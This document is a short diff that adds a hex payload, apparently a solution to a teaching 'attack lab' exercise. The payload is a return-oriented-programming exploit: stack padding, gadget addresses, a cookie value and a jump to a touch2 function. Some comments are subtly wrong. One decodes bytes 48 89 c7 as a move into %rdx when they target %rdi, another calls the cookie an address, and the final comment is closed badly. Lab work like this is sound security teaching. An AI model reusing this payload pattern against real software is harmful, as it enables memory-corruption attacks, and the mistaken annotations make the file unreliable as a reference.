@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00 /* 24 bytes of padding to set return address in proper place. */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d7 19 40 00 00 00 00 00 /* Address of execution byte 58 from farm (getval_115(4019d6 + 1) is popq %rax). */ 
+96 71 18 70 00 00 00 00 /* Cookie address. */
+e5 19 40 00 00 00 00 00 /* Address of execution serie 48 89 c7, so i is movq %rax, %rdx (getval_247(4019e3 + 2)) */
+52 18 40 00 00 00 00 00 /* touch2 function address. /*
